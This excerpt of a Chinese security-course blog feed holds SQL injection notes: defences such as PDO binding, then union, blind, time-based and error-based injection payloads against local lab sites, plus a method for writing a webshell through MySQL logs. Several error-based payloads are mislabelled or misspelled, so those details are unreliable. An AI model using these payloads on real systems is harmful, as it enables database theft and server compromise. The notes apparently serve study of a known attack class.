        <content type="html"><![CDATA[<h1 id="防注入的方式"><a href="#防注入的方式" class="headerlink" title="防注入的方式"></a>防注入的方式</h1><h2 id="针对数字型注入"><a href="#针对数字型注入" class="headerlink" title="针对数字型注入"></a>针对数字型注入</h2><p>可以简单的选择类型强制转换<br>intval()函数，会强制对参数处理。<br><strong>注意：对于字符型的注入则没有意义</strong></p><h2 id="针对字符型注入"><a href="#针对字符型注入" class="headerlink" title="针对字符型注入"></a>针对字符型注入</h2><h3 id="使用函数"><a href="#使用函数" class="headerlink" title="使用函数"></a>使用函数</h3><p>1。addslashes() 把单引号转移<br>2。mysql_real_escape_string() mysql自带的安全函数。</p><h2 id="使用PDO连接数据库"><a href="#使用PDO连接数据库" class="headerlink" title="使用PDO连接数据库"></a>使用PDO连接数据库</h2><p><strong>对字符型和数字型都有效：特指绑定参数的方式</strong><br><strong>使用PDO需要注意连接数据库的两种方式，如果是拼接方式，则不但不能预防SQL注入，而且会引入新的漏洞，多语句注入问题。</strong></p><h3 id="事例（PDO绑定参数）"><a href="#事例（PDO绑定参数）" class="headerlink" title="事例（PDO绑定参数）"></a>事例（PDO绑定参数）</h3><pre><code>// 使用PDO连接数据库$pdo = new PDO(&#39;mysql:host=127.0.0.1;dbname=item&#39;, &#39;root&#39;,&#39;root&#39;);$sql=&quot;select * from item.users where uname = :uname and passwd = :passwd&quot;;$result=$pdo-&gt;prepare($sql);//$result-&gt;bindParam(&#39;:uname&#39;,$uname,PDO::PARAM_STR, 12);//$result-&gt;bindParam(&#39;:passwd&#39;,$upass,PDO::PARAM_STR, 12);$result-&gt;execute( array( &#39;:uname&#39; =&gt; $uname,&#39;:passwd&#39;=&gt; $upass));//$result-&gt;execute();$res=$result-&gt;fetchAll(PDO::FETCH_ASSOC); // 取出来的数组是二维数组                                          // fetch()是获取结果的下一行，是一维数组print_r($res);</code></pre><h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><p>在代码编写时，如果已经对接受的参数进行转义，就不要对其进行二次操作，直到传入数据库。这样可以有效防止人为二次操作造成的SQL注入漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入 原理及分类</title>
      <link href="/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/"/>
      <url>/2019/09/01/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="大致流程"><a href="#大致流程" class="headerlink" title="大致流程"></a>大致流程</h1><p>1。确定注入类型<br>2。确定注入的数据库，数据库版本号<br>3。根据数据库和数据库版本，进行查库<br>4。查表<br>5。查列<br>6。查数据</p><h2 id="Mysql-数据库查询流程"><a href="#Mysql-数据库查询流程" class="headerlink" title="Mysql 数据库查询流程"></a>Mysql 数据库查询流程</h2><h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><pre><code>select schema_name from information_schema.schemata</code></pre><h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><pre><code>select table_name from information_schema.tables where table_schema=&#39;库名&#39;</code></pre><h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容"><a href="#查内容" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from 库名.表名或select 列名 from 库名.表名    等方式都可</code></pre><h2 id="Mssql-数据库查询大致流程"><a href="#Mssql-数据库查询大致流程" class="headerlink" title="Mssql 数据库查询大致流程"></a>Mssql 数据库查询大致流程</h2><h3 id="查库-1"><a href="#查库-1" class="headerlink" title="查库"></a>查库</h3><pre><code>select db_name(n)        n=0 当前库名，n〉0依次遍历库或者select name from master..sysdatabases   查集合</code></pre><h3 id="查表-1"><a href="#查表-1" class="headerlink" title="查表"></a>查表</h3><pre><code>select name from master..sysobjects where xtype=&#39;u&#39;       其中&#39;u&#39;使用用户表 &#39;v&#39;视图  &#39;x&#39;扩展存储过程或者select table_name from information_schema.tables </code></pre><h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><pre><code>select column_name from information_schema.columns where table_name=&#39;表名&#39;</code></pre><h3 id="查内容-1"><a href="#查内容-1" class="headerlink" title="查内容"></a>查内容</h3><pre><code>select * from &#39;表名&#39;或者select &#39;列名&#39; from &#39;表名&#39;</code></pre><h2 id="Mssql-实现limit的三种方式"><a href="#Mssql-实现limit的三种方式" class="headerlink" title="Mssql 实现limit的三种方式"></a>Mssql 实现limit的三种方式</h2><pre><code>1.select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1 查询内容A from 查询来源 order by 1一般id固定为第一列，如果不是需要猜 desc降序) as b括号内查询内容的别名 asc升序2。select top 1 查询内容A from 查询来源 where 查询内容A not in (select top 1序号从0开始，查询内容A from 查询来源)3。select top 1 查询内容A from 查询来源 where 查询内容A not in (&#39;查询结果依次填入，直到查询为空&#39;)</code></pre><h2 id="xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中"><a href="#xml-path-‘路径’-的方式，一次性读取多个字段，保存到xml文档中" class="headerlink" title="xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中"></a>xml path(‘路径’)的方式，一次性读取多个字段，保存到xml文档中</h2><pre><code>    select table_name from information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033224249.png" alt><br>这是遍历table_name的结果写入到了xml文档中<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033304307.png" alt><br>或者这样写，将输出结果进行分割</p><pre><code>    select char(127)+table_name from information_schema.tables for xml path(‘’);</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190907033334781.png" alt></p><h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><h2 id="按注入类型"><a href="#按注入类型" class="headerlink" title="按注入类型"></a>按注入类型</h2><p>1。数字型注入<br>2。字符串型注入</p><h2 id="按请求方式"><a href="#按请求方式" class="headerlink" title="按请求方式"></a>按请求方式</h2><p>1。GET方式<br>2。POST方式</p><h2 id="按页面反馈"><a href="#按页面反馈" class="headerlink" title="按页面反馈"></a>按页面反馈</h2><p>1。union类型注入<br>2。布尔类型注入<br>3。多语句注入<br>4。内联注入</p><h2 id="按布尔类型"><a href="#按布尔类型" class="headerlink" title="按布尔类型"></a>按布尔类型</h2><p>1。布尔注入<br>2。时间延时注入</p><h2 id="按照数据库类型"><a href="#按照数据库类型" class="headerlink" title="按照数据库类型"></a>按照数据库类型</h2><p>1。MySQL数据库注入<br>2。SQLServer数据库注入<br>3。Oracle数据库注入<br>4。Access数据库注入<br>5。Mongodb数据库注入</p><h1 id="SQL注入漏洞的判断"><a href="#SQL注入漏洞的判断" class="headerlink" title="SQL注入漏洞的判断"></a>SQL注入漏洞的判断</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>SQL语句如果出现问题，会有回显。如果编码隐藏了错误回显，就根据程序执行后显示的不同结果进行判断。当出现不正常显示时，想办法将显示结果正常，如果成功就说明有注入的漏洞。<br>如果错误不能恢复正常则说明没有注入漏洞。</p><h2 id="关于MySQL数据库中information-schema库中的三个表"><a href="#关于MySQL数据库中information-schema库中的三个表" class="headerlink" title="关于MySQL数据库中information_schema库中的三个表"></a>关于MySQL数据库中information_schema库中的三个表</h2><h3 id="columns"><a href="#columns" class="headerlink" title="columns"></a>columns</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062125729.png" alt></p><h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062142233.png" alt></p><h3 id="schemata"><a href="#schemata" class="headerlink" title="schemata"></a>schemata</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062154465.png" alt></p><h3 id="大致的选择"><a href="#大致的选择" class="headerlink" title="大致的选择"></a>大致的选择</h3><p>如果只是简单的查询数据库中的表，优先选择schemata<br>如果需要详细查询数据可以选择，columns<br>如果不需要列名的查询，可以选择tables</p><h1 id="SQL注入实际操作"><a href="#SQL注入实际操作" class="headerlink" title="SQL注入实际操作"></a>SQL注入实际操作</h1><h2 id="以自己写的网站为例"><a href="#以自己写的网站为例" class="headerlink" title="以自己写的网站为例"></a>以自己写的网站为例</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062611925.png" alt><br>怀疑有注入点，F12进入hackbar，数字型 -1 验证猜测是否正确<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062625311.png" alt><br>发现新闻页面改变，确定是数字型注入点使用order by 确定列<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062646066.png" alt><br>语法错误，二分法确定列数<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062657006.png" alt><br>确定为6列<br>执行Union联合查询获取数据库信息<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062706069.png" alt><br>确定6、5、3、4列可用</p><pre><code>Union select 1,2,3,version(),database(),user()</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062714597.png" alt></p><pre><code>http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062737576.png" alt><br>或者使用database() 代替 ‘item’ 查询<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062748753.png" alt></p><pre><code>或者hex查询 代替使用database()http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=0x6974656d) </code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062832815.png" alt></p><pre><code>查列名http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062856052.png" alt></p><pre><code>查数据http://127.0.0.1/xiangmu/xinwen/yemianzhanshi.php?id=38  and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users)</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901062912751.png" alt></p><h3 id="单引号注入"><a href="#单引号注入" class="headerlink" title="单引号注入"></a>单引号注入</h3><p>确定6列<br>1234’ and 0 order by 6 #’<br><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063016778.png" alt></p><pre><code>输出表1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;item&#39;)#&#39;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063035581.png" alt></p><pre><code>输出列1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(column_name) from information_schema.columns where table_schema = &#39;item&#39; and table_name = &#39;users&#39;) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063053492.png" alt></p><pre><code>查询数据    1234&#39; and 0 UNION SELECT 1,2,3,4,5,(select group_concat(id,0x7e,uname,0x7e,passwd,0x7e,email,0x7e) from item.users) #</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063109089.png" alt></p><h3 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h3><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><p>通过true和false判断，变相导出数据库的数据<br>相对而言，需要确定，查询的数据库字符串长度，二分法确定字符串。对于ASCII字符转换成HEX进制二分法即可确定字符。如果是Unicode字符串需要相应的函数转换后使用二分法确定字符串。只是相对ASCII更麻烦而以</p><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><pre><code>对information_schema数据库进行查询select schema_name from information_sechma.schemata limit 0,1    取出第一行的数据</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063517834.png" alt></p><pre><code>计算该数据的长度select Length((select schema_name from information_schema.schemata limit 2,1));</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063537401.png" alt></p><pre><code>在注入点盲注二分法猜测字符串长度（注意点：使用盲注查询的顺序可能和数据库控制台查询的顺序不一致）http://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  length((select schema_name from information_schema.schemata limit 1,1))&gt;5—l</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063550078.png" alt></p><pre><code>先取出该字段的第一个字符mid((select schema_name from information_schema.schemata limit 1,1),1,1);使用ASCII比较获取数据字符串ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1));确定该字符ASCII是105    ihttp://192.168.100.17/xiangmu/xinwen/yemianzhanshi.php?id=36 and  ascii(mid((select schema_name from information_schema.schemata limit 1,1),1,1))&gt;105-- l查询第二个字符串ASCII是 116  tascii(mid((select schema_name from information_schema.schemata limit 1,1),2,1))&gt;116-- l根据后台数据库推出该数据库名为item数据库</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063610924.png" alt></p><h4 id="根据数据库名查询数据库下的表名"><a href="#根据数据库名查询数据库下的表名" class="headerlink" title="根据数据库名查询数据库下的表名"></a>根据数据库名查询数据库下的表名</h4><pre><code>数据库后台的运行代码select table_name from information_schema.tables where table_schema=&#39;item&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063645366.png" alt></p><pre><code>使用SQL盲注1．    选择第一行的数据    a)    select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1;2．    计算第一行数据的长度    a)    length((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1));取定字符串长度为7</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063659349.png" alt></p><pre><code>    b)    使用mid截取字符串的第一个字符mid((select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1);    c)    使用ascii判断该字符的ascii值ascii(mid( (select table_name from information_schema.tables where table_schema=&#39;item&#39; limit 0,1),1,1));确定该ASCII字符是112     p    d)    依此类推确定该字符串是 pinglun 字符串</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063714893.png" alt></p><h4 id="根据表名确定表内的-列名-信息"><a href="#根据表名确定表内的-列名-信息" class="headerlink" title="根据表名确定表内的 列名 信息"></a>根据表名确定表内的 列名 信息</h4><pre><code>1．    查询列名的语句    a)    select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39;;</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063809937.png" alt></p><pre><code>    b)    选取第一个计算长度length((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1));    c)    使用mid函数一次选取字符串mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1);    d)    使用ascii依次判断字符ascii(mid((select column_name from information_schema.columns where table_schema=&#39;item&#39; and table_name=&#39;pinglun&#39; limit 0,1),1,1));最终确定该字符串是    pid</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063821821.png" alt></p><h4 id="根据列名信息查询表内的数据"><a href="#根据列名信息查询表内的数据" class="headerlink" title="根据列名信息查询表内的数据"></a>根据列名信息查询表内的数据</h4><pre><code>1．    后台数据库，数据查询    a)    select pid from item.pinglun ; 或者查询所有数据 select * from item.pinglun        i.    使用concat合并成单列多行（group_concat合并成单列单行）    b)    计算第一行的长度length((select pid from item.pinglun limit 0,1));    c)    使用mid依次获取字符串mid((select pid from item.pinglun limit 0,1),1,1);    d)    使用ascii函数依次判断字符串ascii(mid((select pid from item.pinglun limit 0,1),1,1));最后确定该数据是 1</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901063856201.png" alt></p><pre><code>至此通过 infromation_schema数据库中columns表中的 table_schema  存储的数据库名table_name    相应的数据库中的表名column_name  相应的数据库中的表名中包含的所有列名查询完成对该数据库的结构掌握，依次为依据完成对数据库的盲注。    注意：这只适用于mysql5.0版本以上，mongdb有相似的存储结构。</code></pre><h3 id="SQL延时盲注"><a href="#SQL延时盲注" class="headerlink" title="SQL延时盲注"></a>SQL延时盲注</h3><pre><code>下面进行SQL延时盲注的操作，以sqli-labs-master的第九关为例1．    首先判断是否存在注入    a)    发现，无论是否添加 ‘ 或 “ 都不引起页面的变化，可能不存在注入    b)    观察页面猜测很可能是简单语句输出，使用 and sleep(3) 看能否引起睡眠，是否存在时间延时注入</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064024829.png" alt></p><pre><code>    c)    有效则可以确定该处存在 ‘ 时间延时注入2．    开始注入操作  准备：    a)    时间延时注入大体思路和盲注一样，只是对结果的判断从页面的变化该成页面的反应时间。根据页面不同的反应时间判断结果的正确与否，从而导出数据    b)    时间延时的函数有两个        i.    Sleep()：简单的休眠函数        ii.    Benchmark()：重复执行操作，人为的造成页面延时效果1.    Eg：benchmark(10000000,md5(1))    根据电脑性能不同会有延时但时间大体一致    c)    条件控制有两个：        i.    if判断1.    eg：select if((length(version())&gt;3),(sleep(5),0);    判断version()字符串长度是否大于3，是则停顿5秒，否则直接返回</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064039806.png" alt></p><pre><code>        ii.    case判断    类似于 switch1.    eg：case length(version())&gt;3 when 12 then 12 when 1 then ‘true’ when 0 then ‘false’ end;判断version()字符串是否大于3 当结果是12时输出12，当结果是1时输出true 当结果是0时输出false</code></pre><p><img src="/SQL%E6%B3%A8%E5%85%A5-%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E7%B1%BB/20190901064055807.png" alt></p><pre><code>     以上通过对条件和时间的判断，结合盲注的特点完成对注入点的时间延时盲注，导出数据库的信息。3．    开始操作（依次：获取数据的行数，单行数据的字符串长度，单行字符串中每个字符的定位）    a)    查询数据库中表的信息        i.    获取schemata表中schemata_name的第一行数据的字符串长度http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(length((select schema_name from information_schema.schemata limit 0,1))&gt;5,sleep(3),0)#        ii.    通过ascii和mid函数判断该字符的第一个ascii字符http://192.168.100.90/sqli-labs-master/Less-9/?id=1&#39; and if(ascii(mid((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;5,sleep(3),0)#或者这样写case (ascii(mid(select schema_name from information_schema.schemata limit 0,1))&gt;100) when benchmark(10000000,md5(1)) else 0 end    同时可以使用BurpSuite抓包进行数据的修改,在post数据头的修改中很方便    依此类推即可爆出数据库的相关信息。</code></pre><h3 id="十种报错注入"><a href="#十种报错注入" class="headerlink" title="十种报错注入"></a>十种报错注入</h3><p>摘自《代码审计》</p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><h5 id="1。floor"><a href="#1。floor" class="headerlink" title="1。floor()"></a>1。floor()</h5><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><pre><code>必须有三个函数    floor()向下取整    rand()随机数  group by()对查询的相同的项进行分组计数报错的原因：    在group_by()对数据进行分组计数时，floor和rand的结合配上rand()结果*2得到的数据只有0或1，    当group_by遇到1时新建列计数，遇到0时，调用floor()函数再次随机如果结果是1则group_by在插入表项计数时产生主建唯一冲突，报错。</code></pre><p><strong>payload</strong></p><pre><code>Select 1 from (select count(*),concat(user(),floor(rand(0)*2)) x from information_schema.tables group by x)a)</code></pre><h5 id="2。extractvalue"><a href="#2。extractvalue" class="headerlink" title="2。extractvalue()"></a>2。extractvalue()</h5><p><strong>payload</strong></p><pre><code>extractvalue(1,concat(0x5c,(select user())))</code></pre><h5 id="3。updatexml"><a href="#3。updatexml" class="headerlink" title="3。updatexml()"></a>3。updatexml()</h5><p><strong>payload</strong></p><pre><code>updatexml(1,concat(0x5e24,(select user()),0x5e24),1)</code></pre><h5 id="4。geometrycollection"><a href="#4。geometrycollection" class="headerlink" title="4。geometrycollection()"></a>4。geometrycollection()</h5><p><strong>payload</strong></p><pre><code>GeometryCollection((select * from(select * from(select user())a)b))</code></pre><h5 id="5。multipoint"><a href="#5。multipoint" class="headerlink" title="5。multipoint()"></a>5。multipoint()</h5><p><strong>payload</strong></p><pre><code>polygon((select * from(select * from(select user())a)b))</code></pre><h5 id="6。polygon"><a href="#6。polygon" class="headerlink" title="6。polygon()"></a>6。polygon()</h5><p><strong>payload</strong></p><pre><code>multipoint((select * from(select * from(select user())a)b))</code></pre><h5 id="7。multipolygon"><a href="#7。multipolygon" class="headerlink" title="7。multipolygon()"></a>7。multipolygon()</h5><p><strong>payload</strong></p><pre><code>multilinestring((select * from(select * from(select user())a)b))</code></pre><h5 id="8。linestring"><a href="#8。linestring" class="headerlink" title="8。linestring()"></a>8。linestring()</h5><p><strong>payload</strong></p><pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="9。multilinestring"><a href="#9。multilinestring" class="headerlink" title="9。multilinestring()"></a>9。multilinestring()</h5><p><strong>payload</strong></p><pre><code>Multipollygon((select * from(select * from(select user())a)b))</code></pre><h5 id="10。exp"><a href="#10。exp" class="headerlink" title="10。exp()"></a>10。exp()</h5><p><strong>payload</strong></p><pre><code>Exp(~(select * from(select user())a))</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机的隔离设置</title>
      <link href="/2019/09/01/%E5%85%B3%E4%BA%8E%E6%9E%84%E5%BB%BA%E5%AE%8C%E5%85%A8%E9%9A%94%E7%A6%BB%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
      <url>/2019/09/01/%E5%85%B3%E4%BA%8E%E6%9E%84%E5%BB%BA%E5%AE%8C%E5%85%A8%E9%9A%94%E7%A6%BB%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="虚拟机的隔离设置"><a href="#虚拟机的隔离设置" class="headerlink" title="虚拟机的隔离设置"></a>虚拟机的隔离设置</h1><p>常备虚拟机环境 win7/win10<br>常备日常工具<br>保存关机快照，每次工作后，初始化。<br>不用来登陆任何相关的帐户。<br>用户名、系统主机名：等标示随机设置<br>对系统进行隔离，不和主机进行任何文件复制操作。<br>配置环境，从官网下载。<br><strong>注意：U盘设备管理器（U盘每次拔插都会有记录）</strong><br>同步系统时间去掉，共享关闭，电池不同步。</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL写入webshell的两种方式</title>
      <link href="/2019/09/01/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
      <url>/2019/09/01/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="日志写入WebShell"><a href="#日志写入WebShell" class="headerlink" title="日志写入WebShell"></a>日志写入WebShell</h1><p>Mysql每执行一个SQL语句，就会把SQL语句写入到文件日志中，但在默认情况下这个选项是关闭的。<br>因此，需要去开启这个选项，在设置日志路径，日志路径设置为网站目录，日志文件名为 .php 结尾的文件。<br>使用菜刀等工具即可。</p><h2 id="参数的设置"><a href="#参数的设置" class="headerlink" title="参数的设置"></a>参数的设置</h2><p>SET GLOBAL general_log=’ON’<br>SET GLOBAL general_log_file=’绝对路径，需要获取网站的绝对路径’</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>在设置参数后就执行sql命令，将一句话等webshell写入到日志，直接连接即可<br>Linux的日志<br><img src="/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/20190901050452822.png" alt><br>window的日志<br><img src="/MySQL%E5%86%99%E5%85%A5webshell%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F/20190901051837654.png" alt></p><h1 id="SQL语句使用-写入-读取"><a href="#SQL语句使用-写入-读取" class="headerlink" title="SQL语句使用  写入/读取"></a>SQL语句使用  写入/读取</h1><h2 id="into-dumpfile-、into-outfile-区别"><a href="#into-dumpfile-、into-outfile-区别" class="headerlink" title="into dumpfile()、into outfile()区别"></a>into dumpfile()、into outfile()区别</h2><p>outfile：可以导出多行数据，数据写入到文件时有特殊的格式转换，对导出内中的 \n 等特殊字符进行了转移，并且在文件内容的末尾添加了一个新行<br>dumpfile：只能导出一行数据，保持原来数据格式（可以用来导入二进制数据）</p><h3 id="语句例程"><a href="#语句例程" class="headerlink" title="语句例程"></a>语句例程</h3><p>outfile<br>select ‘a\naa\raaaa’ into outfile ‘/tmp/test.txt’<br>dumpfile<br>select ‘a\naa\raaaa’ into dumpfile ‘/tmp/test.txt’</p><h2 id="load-file-读取"><a href="#load-file-读取" class="headerlink" title="load_file()读取"></a>load_file()读取</h2><p>读取一个文件并将其内容作为字符串返回。</p><h3 id="语句例程-1"><a href="#语句例程-1" class="headerlink" title="语句例程"></a>语句例程</h3><p>SELECT LOAD_FILE(‘/data/test.txt’) AS Result;</p>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第七周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpinfo 和 l.php 文件</title>
      <link href="/2019/09/01/phpinfor()-%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/"/>
      <url>/2019/09/01/phpinfor()-%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85/</url>
      
